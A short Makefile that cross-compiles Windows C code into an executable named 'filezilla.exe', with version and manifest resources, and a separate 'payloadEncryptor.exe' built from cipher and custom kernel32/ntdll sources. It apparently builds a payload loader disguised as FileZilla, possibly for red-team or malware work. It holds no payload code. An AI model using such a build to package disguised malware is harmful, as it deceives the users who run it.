# compilers
CC = x86_64-w64-mingw32-gcc
WINDRES = x86_64-w64-mingw32-windres

# flags
CFLAGS = -Os -std=c99 -D_WINDOWS -D_MINGW_USE_STD_THREAD -fstack-protector -mwindows
LDFLAGS = -Wl,--no-insert-timestamp -Wl,--dynamicbase -Wl,--nxcompat

# directories
INC_DIR = ./inc
SRC_DIR = ./src
OBJ_DIR = ./obj
VER_DIR = ./ver

# files
RC_FILE = $(VER_DIR)/version.rc
RES_FILE = $(OBJ_DIR)/version.res
MANIFEST_FILE = $(VER_DIR)/app.manifest
MANIFEST_RC = $(VER_DIR)/manifest.rc
MANIFEST_RES = $(OBJ_DIR)/app_manifest.res
OUT_FILE = filezilla.exe
OUT_FILE_ENCRYPTOR = payloadEncryptor.exe

# source and object files
SRC = $(wildcard $(SRC_DIR)/*.c)
OBJ = $(patsubst $(SRC_DIR)/%.c,$(OBJ_DIR)/%.o,$(SRC))

# default target
all: $(OUT_FILE) $(OUT_FILE_ENCRYPTOR)

# link step
$(OUT_FILE): $(OBJ) $(RES_FILE) $(MANIFEST_RES)
	@echo "Linking the executable with resources and manifest..."
	$(CC) $(LDFLAGS) $(OBJ) $(RES_FILE) $(MANIFEST_RES) -o $@

# compile C sources
$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c | $(OBJ_DIR)
	@echo "Compiling $<..."
	$(CC) $(CFLAGS) -I$(INC_DIR) -c $< -o $@

# compile version resources
$(RES_FILE): $(RC_FILE) | $(OBJ_DIR)
	@echo "Compiling version resources..."
	$(WINDRES) $< -O coff -o $@

# compile manifest resources
$(MANIFEST_RES): $(MANIFEST_RC) | $(OBJ_DIR)
	@echo "Compiling manifest resource..."
	$(WINDRES) $< -O coff -o $@

# ensure obj directory exists
$(OBJ_DIR):
	mkdir -p $(OBJ_DIR)

# clean target
clean:
	@echo "Cleaning up old build artifacts..."
	rm -f $(OUT_FILE) $(RES_FILE) $(MANIFEST_RES) $(OUT_FILE_ENCRYPTOR) $(OBJ_DIR)/*.o

# rebuild target
rebuild: clean all

$(OUT_FILE_ENCRYPTOR): 
	$(CC) $(SRC_DIR)/lucky_cypher.c $(SRC_DIR)/my_kernel32.c $(SRC_DIR)/my_ntdll.c $(SRC_DIR)/my_library_utils.c -I$(INC_DIR) -o $(OUT_FILE_ENCRYPTOR) -D ENCRYPTOR_MAIN

.PHONY: all clean rebuild